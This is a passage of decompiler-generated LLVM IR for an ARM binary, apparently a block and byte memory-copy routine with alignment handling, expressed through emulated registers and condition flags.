  br i1 %v2_1667c, label %dec_label_pc_166cc, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_16678
  %v1_16680 = add i32 %v0_16678, -28
  store i32 %v1_16680, i32* %r2.global-to-local, align 4
  %v3_16680 = sub i32 27, %v0_16678
  %v4_16680 = and i32 %v3_16680, %v1_16678
  %v5_16680 = icmp slt i32 %v4_16680, 0
  store i1 %v5_16680, i1* %cpsr_v.global-to-local, align 1
  %v6_16680 = icmp slt i32 %v1_16680, 0
  store i1 %v6_16680, i1* %cpsr_n.global-to-local, align 1
  %v7_16680 = icmp eq i32 %v1_16678, 20
  store i1 %v7_16680, i1* %cpsr_z.global-to-local, align 1
  %v2_16684 = xor i1 %v6_16680, %v5_16680
  br i1 %v2_16684, label %dec_label_pc_166b8, label %dec_label_pc_16688

dec_label_pc_16688:                               ; preds = %dec_label_pc_16680
  %v0_16688 = load i32, i32* @r4, align 4
  store i32 %v0_16688, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1668c

dec_label_pc_1668c:                               ; preds = %dec_label_pc_1668c.dec_label_pc_1668c_crit_edge, %dec_label_pc_16688
  %v0_16690 = phi i32 [ %v12_16698, %dec_label_pc_1668c.dec_label_pc_1668c_crit_edge ], [ %v0_1669094, %dec_label_pc_16688 ]
  %v0_1668c = phi i32 [ %v0_1668c.pre, %dec_label_pc_1668c.dec_label_pc_1668c_crit_edge ], [ %v0_1668c93, %dec_label_pc_16688 ]
  %v1_1668c = inttoptr i32 %v0_1668c to i32*
  %v2_1668c = load i32, i32* %v1_1668c, align 4
  %v3_1668c = add i32 %v0_1668c, 4
  %v4_1668c = inttoptr i32 %v3_1668c to i32*
  %v5_1668c = load i32, i32* %v4_1668c, align 4
  store i32 %v5_1668c, i32* %r4.global-to-local, align 4
  %v6_1668c = add i32 %v0_1668c, 8
  %v7_1668c = inttoptr i32 %v6_1668c to i32*
  %v8_1668c = load i32, i32* %v7_1668c, align 4
  store i32 %v8_1668c, i32* %ip.global-to-local, align 4
  %v9_1668c = add i32 %v0_1668c, 12
  %v10_1668c = inttoptr i32 %v9_1668c to i32*
  %v11_1668c = load i32, i32* %v10_1668c, align 4
  store i32 %v11_1668c, i32* %lr.global-to-local, align 4
  %v12_1668c = add i32 %v0_1668c, 16
  store i32 %v12_1668c, i32* %r1.global-to-local, align 4
  %v1_16690 = inttoptr i32 %v0_16690 to i32*
  store i32 %v2_1668c, i32* %v1_16690, align 4
  %v3_16690 = add i32 %v0_16690, 4
  %v4_16690 = inttoptr i32 %v3_16690 to i32*
  %v5_16690 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16690, i32* %v4_16690, align 4
  %v6_16690 = add i32 %v0_16690, 8
  %v7_16690 = inttoptr i32 %v6_16690 to i32*
  %v8_16690 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16690, i32* %v7_16690, align 4
  %v9_16690 = add i32 %v0_16690, 12
  %v10_16690 = inttoptr i32 %v9_16690 to i32*
  %v11_16690 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16690, i32* %v10_16690, align 4
  %v12_16690 = add i32 %v0_16690, 16
  store i32 %v12_16690, i32* %r0.global-to-local, align 4
  %v0_16694 = load i32, i32* %r1.global-to-local, align 4
  %v1_16694 = inttoptr i32 %v0_16694 to i32*
  %v2_16694 = load i32, i32* %v1_16694, align 4
  store i32 %v2_16694, i32* @r3, align 4
  %v3_16694 = add i32 %v0_16694, 4
  %v4_16694 = inttoptr i32 %v3_16694 to i32*
  %v5_16694 = load i32, i32* %v4_16694, align 4
  store i32 %v5_16694, i32* %r4.global-to-local, align 4
  %v6_16694 = add i32 %v0_16694, 8
  %v7_16694 = inttoptr i32 %v6_16694 to i32*
  %v8_16694 = load i32, i32* %v7_16694, align 4
  store i32 %v8_16694, i32* @ip, align 4
  %v9_16694 = add i32 %v0_16694, 12
  %v10_16694 = inttoptr i32 %v9_16694 to i32*
  %v11_16694 = load i32, i32* %v10_16694, align 4
  store i32 %v11_16694, i32* %lr.global-to-local, align 4
  %v12_16694 = add i32 %v0_16694, 16
  store i32 %v12_16694, i32* @r1, align 4
  %v1_16698 = inttoptr i32 %v12_16690 to i32*
  store i32 %v2_16694, i32* %v1_16698, align 4
  %v3_16698 = add i32 %v0_16690, 20
  %v4_16698 = inttoptr i32 %v3_16698 to i32*
  %v5_16698 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16698, i32* %v4_16698, align 4
  %v6_16698 = add i32 %v0_16690, 24
  %v7_16698 = inttoptr i32 %v6_16698 to i32*
  %v8_16698 = load i32, i32* @ip, align 4
  store i32 %v8_16698, i32* %v7_16698, align 4
  %v9_16698 = add i32 %v0_16690, 28
  %v10_16698 = inttoptr i32 %v9_16698 to i32*
  %v11_16698 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16698, i32* %v10_16698, align 4
  %v12_16698 = add i32 %v0_16690, 32
  store i32 %v12_16698, i32* @r0, align 4
  %v0_1669c = load i32, i32* %r2.global-to-local, align 4
  %v1_1669c = add i32 %v0_1669c, -32
  store i32 %v1_1669c, i32* %r2.global-to-local, align 4
  %v3_1669c = sub i32 31, %v0_1669c
  %v4_1669c = and i32 %v3_1669c, %v0_1669c
  %v5_1669c = icmp slt i32 %v4_1669c, 0
  %v6_1669c = icmp slt i32 %v1_1669c, 0
  %v2_166a0 = xor i1 %v6_1669c, %v5_1669c
  br i1 %v2_166a0, label %dec_label_pc_166a4, label %dec_label_pc_1668c.dec_label_pc_1668c_crit_edge

dec_label_pc_1668c.dec_label_pc_1668c_crit_edge:  ; preds = %dec_label_pc_1668c
  %v0_1668c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1668c

dec_label_pc_166a4:                               ; preds = %dec_label_pc_1668c
  %v1_166a4 = add i32 %v0_1669c, -16
  %v3_166a4 = add i32 %v0_1669c, 2147483616
  %v4_166a4 = and i32 %v1_166a4, %v3_166a4
  %v5_166a4 = icmp slt i32 %v4_166a4, 0
  store i1 %v5_166a4, i1* %cpsr_v.global-to-local, align 1
  %v6_166a4 = icmp slt i32 %v1_166a4, 0
  store i1 %v6_166a4, i1* %cpsr_n.global-to-local, align 1
  %v7_166a4 = icmp eq i32 %v1_166a4, 0
  store i1 %v7_166a4, i1* %cpsr_z.global-to-local, align 1
  %v2_166a8 = xor i1 %v6_166a4, %v5_166a4
  br i1 %v2_166a8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_166a4
  %v3_166a8 = load i32, i32* @r1, align 4
  %v4_166a8 = inttoptr i32 %v3_166a8 to i32*
  %v5_166a8 = load i32, i32* %v4_166a8, align 4
  store i32 %v5_166a8, i32* @r3, align 4
  %v6_166a8 = add i32 %v3_166a8, 4
  %v7_166a8 = inttoptr i32 %v6_166a8 to i32*
  %v8_166a8 = load i32, i32* %v7_166a8, align 4
  store i32 %v8_166a8, i32* %r4.global-to-local, align 4
  %v9_166a8 = add i32 %v3_166a8, 8
  %v10_166a8 = inttoptr i32 %v9_166a8 to i32*
  %v11_166a8 = load i32, i32* %v10_166a8, align 4
  store i32 %v11_166a8, i32* @ip, align 4
  %v12_166a8 = add i32 %v3_166a8, 12
  %v13_166a8 = inttoptr i32 %v12_166a8 to i32*
  %v14_166a8 = load i32, i32* %v13_166a8, align 4
  store i32 %v14_166a8, i32* %lr.global-to-local, align 4
  %v15_166a8 = add i32 %v3_166a8, 16
  store i32 %v15_166a8, i32* @r1, align 4
  %v4_166ac = inttoptr i32 %v12_16698 to i32*
  store i32 %v5_166a8, i32* %v4_166ac, align 4
  %v6_166ac = add i32 %v0_16690, 36
  %v7_166ac = inttoptr i32 %v6_166ac to i32*
  %v8_166ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_166ac, i32* %v7_166ac, align 4
  %v9_166ac = add i32 %v0_16690, 40
  %v10_166ac = inttoptr i32 %v9_166ac to i32*
  %v11_166ac = load i32, i32* @ip, align 4
  store i32 %v11_166ac, i32* %v10_166ac, align 4
  %v12_166ac = add i32 %v0_16690, 44
  %v13_166ac = inttoptr i32 %v12_166ac to i32*
  %v14_166ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_166ac, i32* %v13_166ac, align 4
  %v15_166ac = add i32 %v0_16690, 48
  store i32 %v15_166ac, i32* @r0, align 4
  %v3_166b0 = load i32, i32* %r2.global-to-local, align 4
  %v4_166b0 = add i32 %v3_166b0, -16
  store i32 %v4_166b0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_166a4, %bb136
  %v3_166c0102111 = phi i32 [ %v15_166ac, %bb136 ], [ %v12_16698, %dec_label_pc_166a4 ]
  %v0_166b8.pre = phi i32 [ %v4_166b0, %bb136 ], [ %v1_1669c, %dec_label_pc_166a4 ]
  %v2_166b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_166b4, i32* @r4, align 4
  br label %dec_label_pc_166b8

dec_label_pc_166b8:                               ; preds = %dec_label_pc_16680, %bb137
  %v3_166c0101 = phi i32 [ %v0_1669094, %dec_label_pc_16680 ], [ %v3_166c0102111, %bb137 ]
  %v0_166b8 = phi i32 [ %v1_16680, %dec_label_pc_16680 ], [ %v0_166b8.pre, %bb137 ]
  %v1_166b8 = add i32 %v0_166b8, 20
  store i32 %v1_166b8, i32* %r2.global-to-local, align 4
  %v3_166b8 = sub i32 0, %v0_166b8
  %v4_166b8 = and i32 %v1_166b8, %v3_166b8
  %v5_166b8 = icmp slt i32 %v4_166b8, 0
  store i1 %v5_166b8, i1* %cpsr_v.global-to-local, align 1
  %v6_166b8 = icmp slt i32 %v1_166b8, 0
  store i1 %v6_166b8, i1* %cpsr_n.global-to-local, align 1
  %v7_166b8 = icmp eq i32 %v1_166b8, 0
  store i1 %v7_166b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_166bc

dec_label_pc_166bc:                               ; preds = %.thread115, %dec_label_pc_166b8
  %v0_166cc.pre157 = phi i32 [ %v0_166cc.pre, %.thread115 ], [ %v1_166b8, %dec_label_pc_166b8 ]
  %v3_166c0 = phi i32 [ %v3_166c099116, %.thread115 ], [ %v3_166c0101, %dec_label_pc_166b8 ]
  %v1_166c4 = phi i1 [ %v1_166c8, %.thread115 ], [ %v5_166b8, %dec_label_pc_166b8 ]
  %v0_166c4 = phi i1 [ %v0_166c8, %.thread115 ], [ %v6_166b8, %dec_label_pc_166b8 ]
  %v2_166bc = xor i1 %v1_166c4, %v0_166c4
  br i1 %v2_166bc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_166bc
  %v3_166bc = load i32, i32* @r1, align 4
  %v4_166bc = inttoptr i32 %v3_166bc to i32*
  %v5_166bc = load i32, i32* %v4_166bc, align 4
  store i32 %v5_166bc, i32* @r3, align 4
  %v6_166bc = add i32 %v3_166bc, 4
  %v7_166bc = inttoptr i32 %v6_166bc to i32*
  %v8_166bc = load i32, i32* %v7_166bc, align 4
  store i32 %v8_166bc, i32* @ip, align 4
  %v9_166bc = add i32 %v3_166bc, 8
  %v10_166bc = inttoptr i32 %v9_166bc to i32*
  %v11_166bc = load i32, i32* %v10_166bc, align 4
  store i32 %v11_166bc, i32* %lr.global-to-local, align 4
  %v12_166bc = add i32 %v3_166bc, 12
  store i32 %v12_166bc, i32* @r1, align 4
  %v4_166c0 = inttoptr i32 %v3_166c0 to i32*
  store i32 %v5_166bc, i32* %v4_166c0, align 4
  %v6_166c0 = add i32 %v3_166c0, 4
  %v7_166c0 = inttoptr i32 %v6_166c0 to i32*
  %v8_166c0 = load i32, i32* @ip, align 4
  store i32 %v8_166c0, i32* %v7_166c0, align 4
  %v9_166c0 = add i32 %v3_166c0, 8
  %v10_166c0 = inttoptr i32 %v9_166c0 to i32*
  %v11_166c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_166c0, i32* %v10_166c0, align 4
  %v12_166c0 = add i32 %v3_166c0, 12
  store i32 %v12_166c0, i32* @r0, align 4
  %v3_166c4 = load i32, i32* %r2.global-to-local, align 4
  %v4_166c4 = add i32 %v3_166c4, -12
  store i32 %v4_166c4, i32* %r2.global-to-local, align 4
  %v6_166c4 = sub i32 11, %v3_166c4
  %v7_166c4 = and i32 %v6_166c4, %v3_166c4
  %v8_166c4 = icmp slt i32 %v7_166c4, 0
  store i1 %v8_166c4, i1* %cpsr_v.global-to-local, align 1
  %v9_166c4 = icmp slt i32 %v4_166c4, 0
  store i1 %v9_166c4, i1* %cpsr_n.global-to-local, align 1
  %v10_166c4 = icmp eq i32 %v3_166c4, 12
  store i1 %v10_166c4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_166bc, %bb138
  %v0_166cc.pre = phi i32 [ %v4_166c4, %bb138 ], [ %v0_166cc.pre157, %dec_label_pc_166bc ]
  %v3_166c099116 = phi i32 [ %v12_166c0, %bb138 ], [ %v3_166c0, %dec_label_pc_166bc ]
  %v1_166c8 = phi i1 [ %v8_166c4, %bb138 ], [ %v1_166c4, %dec_label_pc_166bc ]
  %v0_166c8 = phi i1 [ %v9_166c4, %bb138 ], [ %v0_166c4, %dec_label_pc_166bc ]
  %v2_166c8 = xor i1 %v1_166c8, %v0_166c8
  br i1 %v2_166c8, label %dec_label_pc_166cc, label %dec_label_pc_166bc

dec_label_pc_166cc:                               ; preds = %.thread115, %dec_label_pc_16678
  %v4_166dc = phi i32 [ %v0_1669094, %dec_label_pc_16678 ], [ %v3_166c099116, %.thread115 ]
  %v0_166cc = phi i32 [ %v1_16678, %dec_label_pc_16678 ], [ %v0_166cc.pre, %.thread115 ]
  %v1_166cc = add i32 %v0_166cc, 8
  store i32 %v1_166cc, i32* %r2.global-to-local, align 4
  %v3_166cc = sub i32 0, %v0_166cc
  %v4_166cc = and i32 %v1_166cc, %v3_166cc
  %v5_166cc = icmp slt i32 %v4_166cc, 0
  store i1 %v5_166cc, i1* %cpsr_v.global-to-local, align 1
  %v6_166cc = icmp slt i32 %v1_166cc, 0
  store i1 %v6_166cc, i1* %cpsr_n.global-to-local, align 1
  %v7_166cc = icmp eq i32 %v1_166cc, 0
  store i1 %v7_166cc, i1* %cpsr_z.global-to-local, align 1
  %v2_166d0 = xor i1 %v6_166cc, %v5_166cc
  br i1 %v2_166d0, label %bb140, label %dec_label_pc_166d4

dec_label_pc_166d4:                               ; preds = %dec_label_pc_166cc
  %v1_166d4 = add i32 %v0_166cc, 4
  store i32 %v1_166d4, i32* %r2.global-to-local, align 4
  %v3_166d4 = sub i32 -5, %v0_166cc
  %v4_166d4 = and i32 %v3_166d4, %v1_166cc
  %v5_166d4 = icmp slt i32 %v4_166d4, 0
  store i1 %v5_166d4, i1* %cpsr_v.global-to-local, align 1
  %v6_166d4 = icmp slt i32 %v1_166d4, 0
  store i1 %v6_166d4, i1* %cpsr_n.global-to-local, align 1
  %v7_166d4 = icmp eq i32 %v1_166cc, 4
  store i1 %v7_166d4, i1* %cpsr_z.global-to-local, align 1
  %v2_166d8 = xor i1 %v6_166d4, %v5_166d4
  %v3_166d8 = load i32, i32* @r1, align 4
  %v4_166d8 = inttoptr i32 %v3_166d8 to i32*
  %v5_166d8 = load i32, i32* %v4_166d8, align 4
  store i32 %v5_166d8, i32* @r3, align 4
  %v7_166d8 = add i32 %v3_166d8, 4
  br i1 %v2_166d8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_166d4
  store i32 %v7_166d8, i32* @r1, align 4
  %v5_166dc = inttoptr i32 %v4_166dc to i32*
  store i32 %v5_166d8, i32* %v5_166dc, align 4
  %v6_166dc = load i32, i32* @r0, align 4
  %v7_166dc = add i32 %v6_166dc, 4
  store i32 %v7_166dc, i32* @r0, align 4
  %v0_166ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_166d4
  %v7_166e0 = inttoptr i32 %v7_166d8 to i32*
  %v8_166e0 = load i32, i32* %v7_166e0, align 4
  store i32 %v8_166e0, i32* @ip, align 4
  %v9_166e0 = add i32 %v3_166d8, 8
  store i32 %v9_166e0, i32* @r1, align 4
  %v4_166e4 = inttoptr i32 %v4_166dc to i32*
  store i32 %v5_166d8, i32* %v4_166e4, align 4
  %v6_166e4 = add i32 %v4_166dc, 4
  %v7_166e4 = inttoptr i32 %v6_166e4 to i32*
  %v8_166e4 = load i32, i32* @ip, align 4
  store i32 %v8_166e4, i32* %v7_166e4, align 4
  %v9_166e4 = add i32 %v4_166dc, 8
  store i32 %v9_166e4, i32* @r0, align 4
  %v3_166e8 = load i32, i32* %r2.global-to-local, align 4
  %v4_166e8 = add i32 %v3_166e8, -4
  store i32 %v4_166e8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_166cc, %bb, %dec_label_pc_1689c, %dec_label_pc_16830, %dec_label_pc_167c4, %bb139
  %v0_166ec = phi i32 [ %v0_166ec.pre, %.thread122 ], [ %v2_1673c, %.thread128 ], [ %v1_166cc, %dec_label_pc_166cc ], [ %v2_16660, %bb ], [ %v0_166ec61, %dec_label_pc_1689c ], [ %v0_166ec60, %dec_label_pc_16830 ], [ %v0_166ec59, %dec_label_pc_167c4 ], [ %v4_166e8, %bb139 ]
  %v1_166ec = add i32 %v0_166ec, 4
  store i32 %v1_166ec, i32* %r2.global-to-local, align 4
  %v3_166ec = sub i32 0, %v0_166ec
  %v4_166ec = and i32 %v1_166ec, %v3_166ec
  %v5_166ec = icmp slt i32 %v4_166ec, 0
  store i1 %v5_166ec, i1* %cpsr_v.global-to-local, align 1
  %v6_166ec = icmp slt i32 %v1_166ec, 0
  store i1 %v6_166ec, i1* %cpsr_n.global-to-local, align 1
  %v7_166ec = icmp eq i32 %v1_166ec, 0
  store i1 %v7_166ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_166ec, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_166f4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_166f0 = load i8*, i8** %stack_var_-8, align 4
  %v4_166f0 = ptrtoint i8* %v3_166f0 to i32
  store i32 %v4_166f0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_166f4 = phi i32 [ %v0_166f4.pre, %bb140.bb142_crit_edge ], [ %v8_1665c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_166ec, i32 %v0_166f4)
  %v0_166f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_166f8 = add i32 %v0_166f8, -2
  %v3_166f8 = sub i32 1, %v0_166f8
  %v4_166f8 = and i32 %v3_166f8, %v0_166f8
  %v5_166f8 = icmp slt i32 %v4_166f8, 0
  store i1 %v5_166f8, i1* %cpsr_v.global-to-local, align 1
  %v6_166f8 = icmp slt i32 %v1_166f8, 0
  store i1 %v6_166f8, i1* %cpsr_n.global-to-local, align 1
  %v7_166f8 = icmp eq i32 %v0_166f8, 2
  store i1 %v7_166f8, i1* %cpsr_z.global-to-local, align 1
  %v0_166fc = load i32, i32* @r1, align 4
  %v1_166fc = inttoptr i32 %v0_166fc to i8*
  %v2_166fc = load i8, i8* %v1_166fc, align 1
  %v5_166fc = add i32 %v0_166fc, 1
  store i32 %v5_166fc, i32* %r1.global-to-local, align 4
  %v2_16700 = load i32, i32* @r0, align 4
  %v3_16700 = inttoptr i32 %v2_16700 to i8*
  store i8 %v2_166fc, i8* %v3_16700, align 1
  %v4_16700 = load i32, i32* @r0, align 4
  %v5_16700 = add i32 %v4_16700, 1
  store i32 %v5_16700, i32* %r0.global-to-local, align 4
  %v0_16704 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16704 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16704 = xor i1 %v0_16704, %v1_16704
  br i1 %v2_16704, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16704 = load i32, i32* %r1.global-to-local, align 4
  %v4_16704 = inttoptr i32 %v3_16704 to i8*
  %v5_16704 = load i8, i8* %v4_16704, align 1
  %v8_16704 = add i32 %v3_16704, 1
  store i32 %v8_16704, i32* %r1.global-to-local, align 4
  %v6_16708 = inttoptr i32 %v5_16700 to i8*
  store i8 %v5_16704, i8* %v6_16708, align 1
  %v7_16708 = load i32, i32* %r0.global-to-local, align 4
  %v8_16708 = add i32 %v7_16708, 1
  store i32 %v8_16708, i32* %r0.global-to-local, align 4
  %v1_1670c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1670c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_16710 = phi i32 [ %v8_16708, %bb143 ], [ %v5_16700, %bb142 ]
  %v2_16710 = phi i1 [ %v2_1670c.pre, %bb143 ], [ %v1_16704, %bb142 ]
  %v1_16710 = phi i1 [ %v1_1670c.pre, %bb143 ], [ %v0_16704, %bb142 ]
  %v0_1670c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1670c = xor i1 %v2_16710, %v1_16710
  %v4_1670c = or i1 %v0_1670c, %v3_1670c
  br i1 %v4_1670c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1670c = load i32, i32* %r1.global-to-local, align 4
  %v6_1670c = inttoptr i32 %v5_1670c to i8*
  %v7_1670c = load i8, i8* %v6_1670c, align 1
  %v10_1670c = add i32 %v5_1670c, 1
  store i32 %v10_1670c, i32* %r1.global-to-local, align 4
  %v8_16710 = inttoptr i32 %v7_16710 to i8*
  store i8 %v7_1670c, i8* %v8_16710, align 1
  %v9_16710 = load i32, i32* %r0.global-to-local, align 4
  %v10_16710 = add i32 %v9_16710, 1
  store i32 %v10_16710, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_16714 = load i8*, i8** %stack_var_-8, align 4
  %v3_16714 = ptrtoint i8* %v2_16714 to i32
  store i32 %v3_16714, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1665c)
  %v0_1671c.pre = load i32, i32* @ip, align 4
  %v0_16724.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16728.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1671c

dec_label_pc_1671c:                               ; preds = %dec_label_pc_16668, %.thread126
  %v2_16728 = phi i32 [ %v1_16650, %dec_label_pc_16668 ], [ %v2_16728.pre, %.thread126 ]
  %v0_16724 = phi i32 [ %v0_16650, %dec_label_pc_16668 ], [ %v0_16724.pre, %.thread126 ]
  %v0_1671c = phi i32 [ %v1_16668, %dec_label_pc_16668 ], [ %v0_1671c.pre, %.thread126 ]
  %v1_1671c = sub i32 4, %v0_1671c
  store i32 %v1_1671c, i32* @ip, align 4
  %v1_16720 = add i32 %v1_1671c, -2
  %v3_16720 = sub i32 1, %v1_1671c
  %v4_16720 = and i32 %v3_16720, %v1_1671c
  %v5_16720 = icmp slt i32 %v4_16720, 0
  store i1 %v5_16720, i1* %cpsr_v.global-to-local, align 1
  %v6_16720 = icmp slt i32 %v1_16720, 0
  store i1 %v6_16720, i1* %cpsr_n.global-to-local, align 1
  %v7_16720 = icmp eq i32 %v1_1671c, 2
  store i1 %v7_16720, i1* %cpsr_z.global-to-local, align 1
  %v1_16724 = inttoptr i32 %v0_16724 to i8*
  %v2_16724 = load i8, i8* %v1_16724, align 1
  %v3_16724 = zext i8 %v2_16724 to i32
  store i32 %v3_16724, i32* @r3, align 4
  %v5_16724 = add i32 %v0_16724, 1
  store i32 %v5_16724, i32* @r1, align 4
  %v3_16728 = inttoptr i32 %v2_16728 to i8*
  store i8 %v2_16724, i8* %v3_16728, align 1
  %v4_16728 = load i32, i32* @r0, align 4
  %v5_16728 = add i32 %v4_16728, 1
  store i32 %v5_16728, i32* @r0, align 4
  %v0_1672c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1672c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1672c = xor i1 %v0_1672c, %v1_1672c
  br i1 %v2_1672c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1671c
  %v3_1672c = load i32, i32* @r1, align 4
  %v4_1672c = inttoptr i32 %v3_1672c to i8*
  %v5_1672c = load i8, i8* %v4_1672c, align 1
  %v6_1672c = zext i8 %v5_1672c to i32
  store i32 %v6_1672c, i32* @r3, align 4
  %v8_1672c = add i32 %v3_1672c, 1
  store i32 %v8_1672c, i32* @r1, align 4
  %v6_16730 = inttoptr i32 %v5_16728 to i8*
  store i8 %v5_1672c, i8* %v6_16730, align 1
  %v7_16730 = load i32, i32* @r0, align 4
  %v8_16730 = add i32 %v7_16730, 1
  store i32 %v8_16730, i32* @r0, align 4
  %v1_16734.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16734.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1671c, %bb145
  %v7_16738 = phi i32 [ %v8_16730, %bb145 ], [ %v5_16728, %dec_label_pc_1671c ]
  %v2_16738 = phi i1 [ %v2_16734.pre, %bb145 ], [ %v1_1672c, %dec_label_pc_1671c ]
  %v1_16738 = phi i1 [ %v1_16734.pre, %bb145 ], [ %v0_1672c, %dec_label_pc_1671c ]
  %v0_16734 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16734 = xor i1 %v2_16738, %v1_16738
  %v4_16734 = or i1 %v0_16734, %v3_16734
  br i1 %v4_16734, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16734 = load i32, i32* @r1, align 4
  %v6_16734 = inttoptr i32 %v5_16734 to i8*
  %v7_16734 = load i8, i8* %v6_16734, align 1
  %v8_16734 = zext i8 %v7_16734 to i32
  store i32 %v8_16734, i32* @r3, align 4
  %v10_16734 = add i32 %v5_16734, 1
  store i32 %v10_16734, i32* @r1, align 4
  %v8_16738 = inttoptr i32 %v7_16738 to i8*
  store i8 %v7_16734, i8* %v8_16738, align 1
  %v9_16738 = load i32, i32* @r0, align 4
  %v10_16738 = add i32 %v9_16738, 1
  store i32 %v10_16738, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1686c77 = phi i32 [ %v10_16738, %bb146 ], [ %v7_16738, %.thread127 ]
  %v0_1673c = load i32, i32* %r2.global-to-local, align 4
  %v1_1673c = load i32, i32* @ip, align 4
  %v2_1673c = sub i32 %v0_1673c, %v1_1673c
  store i32 %v2_1673c, i32* %r2.global-to-local, align 4
  %v4_1673c = xor i32 %v1_1673c, %v0_1673c
  %v5_1673c = xor i32 %v2_1673c, %v0_1673c
  %v6_1673c = and i32 %v5_1673c, %v4_1673c
  %v7_1673c = icmp slt i32 %v6_1673c, 0
  store i1 %v7_1673c, i1* %cpsr_v.global-to-local, align 1
  %v8_1673c = icmp slt i32 %v2_1673c, 0
  store i1 %v8_1673c, i1* %cpsr_n.global-to-local, align 1
  %v9_1673c = icmp eq i32 %v0_1673c, %v1_1673c
  store i1 %v9_1673c, i1* %cpsr_z.global-to-local, align 1
  %v2_16740 = xor i1 %v8_1673c, %v7_1673c
  br i1 %v2_16740, label %bb140, label %dec_label_pc_16744

dec_label_pc_16744:                               ; preds = %.thread128
  %v0_16744 = load i32, i32* @r1, align 4
  %v1_16744 = urem i32 %v0_16744, 4
  store i32 %v1_16744, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16744 = icmp eq i32 %v1_16744, 0
  store i1 %v2_16744, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_16744 to i2
  br i1 %v2_16744, label %dec_label_pc_16678, label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16670, %dec_label_pc_16744
  %v0_1686c76 = phi i32 [ %v1_16650, %dec_label_pc_16670 ], [ %v0_1686c77, %dec_label_pc_16744 ]
  %v0_167d4 = phi i32 [ %v2_16660, %dec_label_pc_16670 ], [ %v2_1673c, %dec_label_pc_16744 ]
  %v0_16754.off0 = phi i2 [ %extract.t, %dec_label_pc_16670 ], [ %extract.t131, %dec_label_pc_16744 ]
  %v0_1674c = phi i32 [ %v0_16650, %dec_label_pc_16670 ], [ %v0_16744, %dec_label_pc_16744 ]
  %v1_1674c = and i32 %v0_1674c, -4
  store i32 %v1_1674c, i32* %r1.global-to-local, align 4
  %v1_16750 = inttoptr i32 %v1_1674c to i32*
  %v2_16750 = load i32, i32* %v1_16750, align 4
  store i32 %v2_16750, i32* %lr.global-to-local, align 4
  %v4_16750 = add i32 %v1_1674c, 4
  store i32 %v4_16750, i32* %r1.global-to-local, align 4
  %v1_167cc = add i32 %v0_167d4, -12
  %v3_167cc = sub i32 11, %v0_167d4
  %v4_167cc = and i32 %v3_167cc, %v0_167d4
  %v5_167cc = icmp slt i32 %v4_167cc, 0
  store i1 %v5_167cc, i1* %cpsr_v.global-to-local, align 1
  %v6_167cc = icmp slt i32 %v1_167cc, 0
  store i1 %v6_167cc, i1* %cpsr_n.global-to-local, align 1
  %v7_167cc = icmp eq i32 %v0_167d4, 12
  store i1 %v7_167cc, i1* %cpsr_z.global-to-local, align 1
  %v2_167d0 = xor i1 %v6_167cc, %v5_167cc
  switch i2 %v0_16754.off0, label %dec_label_pc_16760 [
    i2 -1, label %dec_label_pc_16838
    i2 -2, label %dec_label_pc_167cc
  ]

dec_label_pc_16760:                               ; preds = %dec_label_pc_1674c
  br i1 %v2_167d0, label %dec_label_pc_167ac, label %dec_label_pc_16768

dec_label_pc_16768:                               ; preds = %dec_label_pc_16760
  store i32 %v1_167cc, i32* %r2.global-to-local, align 4
